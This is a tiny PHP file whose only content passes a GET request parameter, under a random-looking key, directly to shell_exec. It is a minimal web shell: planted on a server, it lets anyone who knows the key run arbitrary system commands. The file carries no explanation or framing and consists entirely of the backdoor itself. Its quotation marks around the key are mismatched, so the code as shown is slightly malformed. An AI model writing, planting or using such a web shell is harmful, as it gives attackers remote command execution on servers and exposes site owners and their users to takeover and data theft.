<?php
shell_exec($_GET[’SuCTJ292']);
?>
